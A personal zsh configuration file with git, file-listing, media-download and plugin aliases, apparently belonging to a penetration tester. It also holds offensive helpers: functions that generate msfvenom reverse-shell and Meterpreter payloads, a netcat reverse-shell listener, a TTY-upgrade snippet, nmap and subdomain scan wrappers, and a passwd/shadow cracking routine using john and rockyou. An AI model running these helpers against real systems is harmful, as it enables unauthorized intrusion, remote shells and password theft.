# .------..------..------..------..------.
# |Z.--. ||S.--. ||H.--. ||R.--. ||C.--. |
# | :(): || :/\: || :/\: || :(): || :/\: |
# | ()() || :\/: || (__) || ()() || :\/: |
# | '--'Z|| '--'S|| '--'H|| '--'R|| '--'C|
# `------'`------'`------'`------'`------'

#
# Settings
#

# History
HISTSIZE=10000
SAVEHIST="$HISTSIZE"

#
# Aliases & Scripts
#

# git
alias gaa="git add ."
alias gcm="git commit -m"
alias gsu="git submodule update --remote"
alias gsa="git submodule add"
alias gpush="git push -u origin"
alias gpull="git pull"

# eza (modern ls replacement)
alias ls="eza --icons"
alias ll="eza -l --icons"
alias l="eza -l -a --icons"

alias tree="eza -l -a --icons --tree --ignore-glob='.git'"

# bat (modern cat replacement)
alias cat="bat -pp"

# zoxide (modern cd replacement)
alias cd="z"

alias ..="z .."
alias ...="z ../.."
alias ....="z ../../.."
alias .....="z ../../../.."
alias ......="z ../../../../.."

# kitty terminal
alias icat="kitty +kitten icat"
alias connect="kitty +kitten ssh"

# podman/docker
alias dr="podman run"
alias dx="podman exec"
alias dps="podman ps"
alias dpsa="podman ps -a"

# neovim
alias v="nvim"
alias vi="nvim"
alias vim="nvim"

# rebos
alias rebos-build="rebos gen current build"
alias rebos-commit="rebos gen commit"

# tty upgrades
alias uptty="echo '/usr/bin/script -qc /bin/bash /dev/null'| wl-copy"

# nmap
nmap-default() {
  if [ $# -eq 0 ]
    then
      echo "[i] Usage: nmap-default ip (options)"
    else
      [ ! -d "./nmap" ] && echo "[i] Creating $(pwd)/nmap..." && mkdir nmap
      sudo nmap -sCV -T4 --min-rate 10000 "${@}" -v -oA nmap/tcp_default
  fi
}

nmap-udp() {
  if [ $# -eq 0 ]
    then
      echo "[i] Usage: nmap-udp ip (options)"
    else
      [ ! -d "./nmap" ] && echo "[i] Creating $(pwd)/nmap..." && mkdir nmap
      sudo nmap -sUCV -T4 --min-rate 10000 "${@}" -v -oA nmap/udp_default
  fi
}

# msfvenom
venom-linux() {
  if [ $# -eq 0 ]
    then
      echo "[i] Usage: msfvenom ip (options)"
    else
      msfvenom -p linux/x64/shell_reverse_tcp LHOST="${@}" LPORT=4444 -f elf -o reverse.elf
  fi
}

venom-win() {
  if [ $# -eq 0 ]
    then
      echo "[i] Usage: msfvenom ip (options)"
    else
      msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST="${@}" LPORT=4444 -f exe -o reverse.exe
  fi
}

# discovery
subdomainscan() {
  if [ $# -eq 0 ]
    then
      echo "[i] Usage: Enter a valid domain (options)"
    else
      wfuzz -c -f sub-domains.txt -Z -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt --sc 200,202,204,301,302,307,403 -u http://"${@}" -H "Host: FUZZ.${@}"
  fi
}

contentscan() {
  if [ $# -eq 0 ]
    then
      echo "[i] Usage: Enter a valid url (options)"
    else
      chameleon -u "${@}" -a --wordlist /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
  fi
}

# yt-dlp
yt2wav() {
  if [ $# -eq 0 ]
    then
      echo "[i] Usage: Enter a valid link (options)"
    else
      yt-dlp --extract-audio --audio-format wav "${@}"
  fi
}

yt2mp3() {
  if [ $# -eq 0 ]
    then
      echo "[i] Usage: Enter a valid link (options)"
    else
      yt-dlp --extract-audio --audio-format mp3 "${@}"
  fi
}

yt2mp4() {
  if [ $# -eq 0 ]
    then
      echo "[i] Usage: Enter a valid link (options)"
    else
      yt-dlp -S res,ext:mp4:m4a --recode mp4 "${@}"
  fi
}

# mental issues
alias lcs="clear"
alias cleare ="clear"
alias clea="clear"
alias cear="clear"
alias lcear="clear"
alias clera="clear"
alias celar="clear"
alias cler="clear"
alias claer="clear"
alias clearc="clear"
alias cleawr="clear"
alias caler="clear"
alias calar="clear"
alias cclear="clear"
alias rclear="clear"
alias rlear="clear"
alias rclear="clear"
alias rcle="clear"
alias rcler="clear"
alias cls="clear"
alias csl="clear"

# other
alias df="duf"
alias rr="ranger"
alias gdb="gdb --quiet"
alias cds="du -h --max-depth=1 ."
alias rsc="rlwrap nc -lnvp 4444"
alias notes="glow --local ~/Sync/Notes"
alias www="sudo python3 -m http.server 80"
alias tcp-server="cd /tmp/ && while :; do nc -l -p 4444 | tee  output.log; sleep 1; done"

ips() {
  ip a show scope global | awk '/^[0-9]+:/ { sub(/:/,"",$2); iface=$2 } /^[[:space:]]*inet / { split($2, a, "/"); print "[\033[96m" iface"\033[0m] "a[1] }'
}

pacman-fix() {
  sudo pacman -Scc
  sudo mv /etc/pacman.d/gnupg /etc/pacman.d/gnupg.backup
  sudo pacman-key --init
  sudo pacman-key --populate
  sudo pacman -Syu
}

yescrypt-crack() {
    if [ -f "./passwd" ] && [ -f "./shadow" ]; then
        sudo unshadow passwd shadow > unshadow.txt
        echo "UNSHADOW COMPLETED!"
        sudo john --format=crypt unshadow.txt -w=/usr/share/wordlists/rockyou.txt
    else
        echo "At least one of the files does not exist."
    fi
}


op() {
  if [ $# -eq 0 ]
    then
      echo "[i] Usage: Enter a port number (options)"
    else
      sudo firewall-cmd --zone=public --add-port="${@}"/tcp
  fi
}

#
# Paths & variables
#

# tools
export PATH="$PATH:$HOME/Tools/bin/"

# cargo
export PATH="$PATH:$HOME/.cargo/bin/"

# go
export GOPATH=$HOME/go
export PATH=$PATH:$GOROOT/bin:$GOPATH/bin

# terminal
export TERM=xterm-256color

# bat theme
export BAT_THEME="Catppuccin Mocha"

#
# Zplug
#

source ~/.zplug/init.zsh

# Make sure to use double quotes
zplug "zsh-users/zsh-history-substring-search"

# Use the package as a command
# And accept glob patterns (e.g., brace, wildcard, ...)
zplug "Jxck/dotfiles", as:command, use:"bin/{histuniq,color}"

# Disable updates using the "frozen" tag
zplug "k4rthik/git-cal", as:command, frozen:1

# Run a command after a plugin is installed/updated
# Provided, it requires to set the variable like the following:
# ZPLUG_SUDO_PASSWORD="********"
zplug "jhawthorn/fzy", \
    as:command, \
    rename-to:fzy, \
    hook-build:"make && sudo make install"

# Supports checking out a specific branch/tag/commit
zplug "b4b4r07/enhancd", at:v1
zplug "mollifier/anyframe", at:4c23cb60

# Can manage gist file just like other packages
zplug "b4b4r07/79ee61f7c140c63d2786", \
    from:gist, \
    as:command, \
    use:get_last_pane_path.sh

# Rename a command with the string captured with `use` tag
zplug "b4b4r07/httpstat", \
    as:command, \
    use:'(*).sh', \
    rename-to:'$1'

# Syntax highlighting
zplug "zsh-users/zsh-syntax-highlighting", defer:2

# Set the priority when loading
if ! zplug check --verbose; then
    printf "Install? [y/N]: "
    if read -q; then
        echo; zplug install
    fi
fi

zplug load #--verbose

#
# Syntax highlighting theme
#

# catppuccin theme
source ~/.zsh/catppuccin_mocha-zsh-syntax-highlighting.zsh

#
# Prompt
#

# init starship
eval "$(starship init zsh)"

#
# Zoxide
#

# init zoxide
eval "$(zoxide init zsh)"

#
# Nix
#

# init nix
if [ -e /home/qrxnz/.nix-profile/etc/profile.d/nix.sh ]; then . /home/qrxnz/.nix-profile/etc/profile.d/nix.sh; fi
